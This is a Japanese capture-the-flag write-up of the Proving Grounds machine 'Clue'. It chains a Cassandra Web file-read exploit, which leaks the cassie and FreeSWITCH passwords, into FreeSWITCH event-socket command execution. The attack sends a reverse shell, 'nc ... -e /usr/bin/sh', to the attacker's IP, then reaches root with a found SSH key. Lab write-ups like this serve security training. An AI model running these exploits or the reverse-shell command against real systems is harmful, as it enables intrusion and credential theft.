+++
title = "Proving Grounds Practice - Clue Writeup"
date = "2026-10-20"
description = "Cassandra WebのRemote File Read脆弱性で認証情報を窃取し、FreeSWITCH mod_event_socketのCommand Executionを利用してシェルを取得、最終的にSSH秘密鍵でroot権限を取得"
tags = ["Proving Grounds Practice", "CTF", "[Linux]", "[Clue]", "[Cassandra Web]", "[Remote File Read]", "[FreeSWITCH]", "[Event Socket]", "[SMB]", "[Exploit-DB]", "[very hard]"]
categories = ["Proving Grounds Practice"]
toc = true
draft = false
+++

## Machine Info

| Field | Details |
|-------|---------|
| Machine | Clue |
| OS | Linux |
| Target IP | 192.168.178.240 |

---

## Reconnaissance

### Nmap Scan

まず、対象ホストに対して全ポートスキャンとサービス検出・デフォルトスクリプトを実行する。

```bash
nmap -sC -sV -p- 192.168.178.240
```

スキャン結果は以下のとおり。

```text
PORT     STATE SERVICE          VERSION
22/tcp   open  ssh              OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA)
|   256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA)
|_  256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519)
80/tcp   open  http             Apache httpd 2.4.38
|_http-title: 403 Forbidden
|_http-server-header: Apache/2.4.38 (Debian)
139/tcp  open  netbios-ssn      Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn      Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
3000/tcp open  http             Sinatra web framework
|_http-title: Cassandra Web
|_http-server-header: thin
8021/tcp open  freeswitch-event FreeSWITCH mod_event_socket
Service Info: Hosts: 127.0.0.1, CLUE; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: clue
|   NetBIOS computer name: CLUE\x00
|   Domain name: pg
|   FQDN: clue.pg
|_  System time: 2026-10-20T09:45:39-04:00
| smb2-time: 
|   date: 2026-10-20T13:45:36
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 1h23m23s, deviation: 2h18m36s, median: 3m22s
```

ポート22(SSH)、80(Apache)、139/445(Samba)、3000(Cassandra Web)、8021(FreeSWITCH mod_event_socket)が開いていることを確認した。また、SambaのホストスクリプトからホストFQDNが `clue.pg`、ドメイン名が `pg` であることも分かる。

### FreeSWITCH Exploitの事前調査

ポート8021でFreeSWITCHのmod_event_socketが稼働していることから、関連するExploitを検索する。

```bash
searchsploit freeswitch
```

```text
Exploit Title                                             |  Path
----------------------------------------------------------- ---------------------------------
FreeSWITCH - Event Socket Command Execution (Metasploit)   | multiple/remote/47698.rb
FreeSWITCH 1.10.1 - Command Execution                      | windows/remote/47799.txt
```

```bash
searchsploit -m windows/remote/47799.txt
```

この時点ではmod_event_socketの認証パスワードが不明なため、まずはデフォルト設定のまま実行を試みたが、認証に失敗した。

```bash
python3 exp.py 192.168.178.240 whoami
```

```text
Authentication failed
```

パスワードを特定するため、他のサービス(Apache, Cassandra Web, Samba)の調査に移る。

---

## Enumeration

### Port 80 Directory Enumeration

ポート80へアクセスすると403 Forbiddenが返る。

```text
http://192.168.178.240/
Forbidden
```

ディレクトリ探索を行う。

```bash
gobuster dir -u http://192.168.178.240/ -w /usr/share/wordlists/dirb/common.txt
```

```text
.hta                 (Status: 403) [Size: 280]
.htaccess            (Status: 403) [Size: 280]
.htpasswd            (Status: 403) [Size: 280]
backup               (Status: 301) [Size: 319] [--> http://192.168.178.240/backup/]
server-status        (Status: 403) [Size: 280]
Progress: 4613 / 4613 (100.00%)
```

`.hta`、`.htaccess`、`.htpasswd`、`server-status` はいずれも403で直接の情報は得られないが、`backup` ディレクトリへのリダイレクトが見つかった(301)。このディレクトリ自体にも直接アクセスはできないため、後述のSMB共有と合わせて調査する。

### Cassandra Web (Port 3000)

ポート3000へアクセスすると、Cassandra Web(Cassandraデータベース管理用のWebインターフェース)が稼働していた。

```bash
curl http://192.168.178.240:3000/
```

```html
<!DOCTYPE html>
<html lang="en" ng-app="cassandra">
  <head>
    <base href="/">
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Cassandra Web</title>

    <!-- Bootstrap -->
    <link rel="stylesheet" href="/css/bootstrap.css">
    <link rel="stylesheet" href="/css/bootstrap-theme.css">

    <!-- CodeMirror -->
    <link rel="stylesheet" href="/css/codemirror.css">
    <link rel="stylesheet" href="/css/codemirror-solarized.css">
    <!-- Prism -->
    <link rel="stylesheet" href="/css/prism.css">

    <!-- Cassandra Web -->
    <link rel="stylesheet" href="/css/style.css">
  </head>
  <body ng-controller="main">
    <div class="navbar navbar-inverse navbar-fixed-top" role="navigation">
      <div class="container-fluid">
        <div class="navbar-header">
          <a class="navbar-brand" href="/">Cassandra Web</a>
        </div>
        <div class="navbar-collapse collapse">
          <ul class="nav navbar-nav navbar-right">
            <li><a class="btn btn-lg" ng-click="show_execute_form()">Execute <span class="glyphicon glyphicon-edit"></span></a></li>
          </ul>
        </div>
      </div>
    </div>

    <div class="container-fluid">
      <div class="row">
        <div class="col-sm-3 col-md-2 sidebar">
          <section>
            <h2>Keyspaces</h2>
            <ul class="nav nav-pills nav-stacked nav-sidebar">
              <li ng-repeat="keyspace in cluster.keyspaces" ng-class="keyspace_class(keyspace)">
                <a href="/{{keyspace.name}}">{{keyspace.name}} <span class="badge pull-right">{{keyspace.tables.length}}</span></a>
              </li>
            </ul>
          </section>
          <section>
            <h2>Hosts</h2>
            <ul class="nav nav-sidebar">
              <li ng-repeat="host in cluster.hosts" ng-class="host_class(host)">
                <span class="label label-{{host_status_class(host.status)}}">{{host.ip}} ({{host.status}})</span>
              </li>
            </ul>
          </section>
        </div>
        <div class="col-sm-9 col-md-10 main" ng-view>
        </div>
      </div>
    </div>

    <!-- Angular -->
    <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.3.0-rc.0/angular.min.js"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.3.0-rc.0/angular-route.min.js"></script>
    <script src="/js/angular-filter.min.js"></script>
    <script src="/js/ui-bootstrap-tpls.min.js"></script>
    <!-- CodeMirror -->
    <script src="/js/codemirror.js"></script>
    <script src="/js/codemirror-sql.js"></script>
    <script src="/js/ui-codemirror.js"></script>
    <!-- Prism -->
    <script src="/js/prism.js"></script>
    <!-- Cassandra Web -->
    <script src="/js/cassandra.js"></script>
  </body>
</html>
```

`<title>Cassandra Web</title>` や `ng-app="cassandra"` から、Cassandra Webであることが確定した。バージョン特定のため既知の脆弱性を調査する。

```bash
searchsploit cassandra web
```

```text
Exploit Title                                             |  Path
----------------------------------------------------------- ---------------------------------
Cassandra Web 0.5.0 - Remote File Read                     | linux/webapps/49362.py
```

Exploitの内容を確認する。

```bash
cat 49362.py
```

```python
# Exploit Title: Cassandra Web 0.5.0 - Remote File Read
# Date: 12-28-2020
# Exploit Author: Jeremy Brown
# Vendor Homepage: https://github.com/avalanche123/cassandra-web
# Software Link: https://rubygems.org/gems/cassandra-web/versions/0.5.0
# Version: 0.5.0
# Tested on: Linux

#!/usr/bin/python
# -*- coding: UTF-8 -*-
#
# cassmoney.py
#
# Cassandra Web 0.5.0 Remote File Read Exploit
#
# Jeremy Brown [jbrown3264/gmail]
# Dec 2020
#
# Cassandra Web is vulnerable to directory traversal due to the disabled
# Rack::Protection module. Apache Cassandra credentials are passed via the
# CLI in order for the server to auth to it and provide the web access, so
# they are also one thing that can be captured via the arbitrary file read.
#
# Usage
# > cassmoney.py 10.0.0.5 /etc/passwd
# root:x:0:0:root:/root:/bin/bash
# daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
# bin:x:2:2:bin:/bin:/usr/sbin/nologin
# ...
#
# > cassmoney.py 10.0.0.5 /proc/self/cmdline
# /usr/bin/ruby2.7/usr/local/bin/cassandra-web--usernameadmin--passwordP@ssw0rd
#
# (these creds are for auth to the running apache cassandra database server)
#
# Fix
# - fixed in github repo
# - v0.6.0 / ruby-gems when available
# (still recommended to containerize / run this in some sandbox, apparmor, etc)
#
```

このExploitは、Rack::Protectionモジュールが無効化されていることに起因するディレクトリトラバースの脆弱性を利用し、任意のファイルを読み取るものである。また、Cassandra Webの起動コマンドライン(`/proc/self/cmdline`)にはApache Cassandraへの認証情報が平文で含まれるため、これも読み取り可能である点が特徴的に記載されている。

まず `/etc/passwd` を読み取り、ユーザー一覧を確認する。

```bash
python3 49362.py -p 3000 192.168.178.240 /etc/passwd
```

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
ntp:x:106:113::/nonexistent:/usr/sbin/nologin
cassandra:x:107:114:Cassandra database,,,:/var/lib/cassandra:/usr/sbin/nologin
cassie:x:1000:1000::/home/cassie:/bin/bash
freeswitch:x:998:998:FreeSWITCH:/var/lib/freeswitch:/bin/false
anthony:x:1001:1001::/home/anthony:/bin/bash
```

`/etc/passwd` から `cassie`、`freeswitch`、`anthony` といったログイン可能なユーザーの存在が確認できた。

次に、Exploitの説明に従い `/proc/self/cmdline` を読み取り、Cassandra Web自身の起動時認証情報を窃取する。

```bash
python3 49362.py -p 3000 192.168.178.240 /proc/self/cmdline
```

```text
/usr/bin/ruby2.5/usr/local/bin/cassandra-web-ucassie-pSecondBiteTheApple330
```

これにより、以下の認証情報を取得した。

- ユーザー名: `cassie`
- パスワード: `SecondBiteTheApple330`

取得したパスワードを用いて再度FreeSWITCHのExploit実行を試みたが、この時点ではまだmod_event_socketの認証パスワードが判明していないため失敗する。

```bash
python3 47799.py 192.168.178.240 id
```

```text
Authentication failed
```

`cassie` の認証情報はFreeSWITCH(ポート8021)自体の認証には利用できないことが分かり、引き続きSMB共有の調査を行う。

### SMB Enumeration

SMB共有を列挙する。

```bash
smbclient -L //192.168.178.240/ -N
```

```text
        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        backup          Disk      Backup web directory shares
        IPC$            IPC       IPC Service (Samba 4.9.5-Debian)
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            
```

`backup` 共有(コメント: "Backup web directory shares")には匿名(Null session)でアクセス可能であり、先ほどApache側で見つけた `/backup/` ディレクトリに対応することが分かる。共有内を確認する。

```bash
smbclient //192.168.178.240/backup -N
```

```text
smb: \> ls
  freeswitch                          D        0  Fri Aug  5 17:43:51 2022
  cassandra                           D        0  Sat May  7 00:04:47 2022
              14343176 blocks of size 1024. 10593616 blocks available

smb: \> cd cassandra\
smb: \cassandra\> ls
  usr                                 D        0  Sat May  7 00:04:47 2022
  var                                 D        0  Sat May  7 00:04:47 2022
  etc                                 D        0  Sat May  7 00:04:47 2022

smb: \cassandra\> cd etc\
smb: \cassandra\etc\> ls
  default                             D        0  Sat May  7 00:04:47 2022
  security                            D        0  Sat May  7 00:04:47 2022
  init.d                              D        0  Sat May  7 00:04:47 2022
  cassandra                           D        0  Sat May  7 00:04:47 2022
  sysctl.d                            D        0  Sat May  7 00:04:47 2022

smb: \cassandra\etc\> cd cassandra\
smb: \cassandra\etc\cassandra\> ls
  jvm.options                         N     9956  Sat May  7 00:04:47 2022
  commitlog_archiving.properties      N     2082  Sat May  7 00:04:47 2022
  logback.xml                         N     3809  Sat May  7 00:04:47 2022
  hotspot_compiler                    N     2757  Sat May  7 00:04:47 2022
  cassandra.yaml                      N    61203  Sat May  7 00:04:47 2022
  triggers                            D        0  Sat May  7 00:04:47 2022
  cassandra-rackdc.properties         N     1200  Sat May  7 00:04:47 2022
  logback-tools.xml                   N     1195  Fri May  6 23:35:30 2022
  cassandra-env.sh                    N    12697  Sat May  7 00:04:47 2022
  cassandra-topology.properties       N     1358  Sat May  7 00:04:47 2022

smb: \cassandra\etc\cassandra\> mget *
```

`backup` 共有には `freeswitch` ディレクトリも存在しており、Cassandraだけでなく **FreeSWITCHの設定ファイル一式もバックアップとして公開されている可能性が高い** ことが分かった。ただし、SMB経由で `freeswitch` ディレクトリ配下を逐一辿るよりも、Cassandra Webの任意ファイル読み取り脆弱性を使ってApache経由で直接設定ファイルを読み取る方針とした。

### FreeSWITCH 設定ファイルの特定

mod_event_socketの設定ファイルが格納されている一般的なパスをGoogleで調査する。

検索キーワード: `FreeSWITCH mod_event_socket configuration file`

解説サイトやGitHubのファイル階層から、設定ファイルが以下のパスに存在することが判明した。

```text
freeswitch/conf/sbc/autoload_configs/event_socket.conf.xml
```

参考: [FreeSWITCH Event Socket - SignalWire Developer Docs](https://developer.signalwire.com/freeswitch/integration/event-socket/)

Cassandra Webの任意ファイル読み取り脆弱性を使い、この設定ファイルを読み取る。

```bash
python3 49362.py -p 3000 192.168.178.240 /etc/freeswitch/autoload_configs/event_socket.conf.xml
```

```xml
<configuration name="event_socket.conf" description="Socket Client">
  <settings>
    <param name="nat-map" value="false"/>
    <param name="listen-ip" value="0.0.0.0"/>
    <param name="listen-port" value="8021"/>
    <param name="password" value="StrongClueConEight021"/>
  </settings>
</configuration>
```

mod_event_socket(ポート8021)の認証パスワード `StrongClueConEight021` を取得できた。

---

## Exploitation

### FreeSWITCH mod_event_socket Command Execution

先ほどダウンロードしたExploit(`47799.py`)内のデフォルトパスワードを、取得したパスワードに書き換える。

```python
PASSWORD = 'StrongClueConEight021'  # default password for FreeSWITCH
```

書き換え後に認証を試みる。

```bash
python3 47799.py 192.168.178.240 id
```

```text
Authenticated
Content-Type: api/response
Content-Length: 63

uid=998(freeswitch) gid=998(freeswitch) groups=998(freeswitch)
```

認証に成功し、`freeswitch` ユーザーとしてコマンド実行が可能になった。これを利用してリバースシェルを取得する。

攻撃者側でリスナーを起動する。

```bash
nc -lvnp 3000
```

Exploit経由でリバースシェルを確立するコマンドを送信する。

```bash
python3 47799.py 192.168.178.240 'nc 192.168.45.180 3000 -e /usr/bin/sh'
```

```text
Authenticated
```

攻撃者側のリスナーで接続を確認する。

```text
listening on [any] 3000 ...
connect to [192.168.45.180] from (UNKNOWN) [192.168.178.240] 47118
```

接続が確立したため、TTYを安定化させる。

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

これで `freeswitch` ユーザーとしてのシェルを取得した。

### Local Flag

```bash
find / -iname 'local.txt' 2>/dev/null
```

```text
/var/lib/freeswitch/local.txt
```

---

## Privilege Escalation

### freeswitch → cassie

Cassandra Webの任意ファイル読み取りで取得した認証情報(`cassie` / `SecondBiteTheApple330`)を用いて、`cassie` ユーザーへスイッチする。

```bash
su cassie
```

```text
Password: SecondBiteTheApple330

cassie@clue:/home$
```

### cassie → root

`cassie` のホームディレクトリを確認すると、SSH秘密鍵が設置されていた。

```bash
ls ~
```

```text
id_rsa
```

この秘密鍵を用いて `root` としてローカルホストへSSHログインを試みる。

```bash
ssh root@localhost -i id_rsa
```

```text
Linux clue 4.19.0-21-amd64 #1 SMP Debian 4.19.249-2 (2022-06-30) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Apr 29 17:57:54 2024
root@clue:~#
```

鍵認証が通り、`root` 権限でのシェルを取得した。

---

## Summary

Clueの攻略では、複数の公開サービスを連鎖的に悪用して権限昇格を行った。

1. Nmapによるポート・サービスの列挙(SSH, Apache, Samba, Cassandra Web, FreeSWITCH)
2. FreeSWITCH mod_event_socketのExploitをデフォルトパスワードのまま試行するが失敗
3. Apacheのディレクトリ探索で `/backup/` を発見するも直接アクセス不可
4. Cassandra Web 0.5.0のRemote File Read脆弱性を発見
5. `/etc/passwd` からユーザー一覧(`cassie`, `freeswitch`, `anthony`)を確認
6. `/proc/self/cmdline` からCassandra Web自身の認証情報(`cassie` のパスワード)を窃取
7. 窃取したパスワードでFreeSWITCHのExploitを再試行するが、別サービスの認証情報であるため失敗
8. SMBの `backup` 共有(Null session)を列挙し、Cassandra関連ファイルに加えFreeSWITCH関連のバックアップも存在することを確認
9. FreeSWITCHの設定ファイルパス(`event_socket.conf.xml`)をGoogle検索で特定
10. 同じRemote File Read脆弱性を使い `event_socket.conf.xml` を読み取り、mod_event_socketの認証パスワードを窃取
11. FreeSWITCH mod_event_socketのCommand Executionを利用してリバースシェルを取得(`freeswitch` ユーザー)
12. 窃取したパスワードで `cassie` ユーザーへスイッチ
13. `cassie` のホームディレクトリにあったSSH秘密鍵を使い `root` としてログインし、最終的に完全な権限を取得

今回のポイントは、**1つの任意ファイル読み取り脆弱性(Cassandra Web)を起点に、アプリケーション自身の認証情報だけでなく他サービス(FreeSWITCH)の設定ファイルまで読み取ることで、複数の認証情報を連鎖的に窃取し侵入に至ったこと**である。また、認証情報を1つ入手しても即座に別サービスで使い回せるとは限らず、どのサービスに対する認証情報かを見極めながら調査を進める必要がある点も学びとなった。
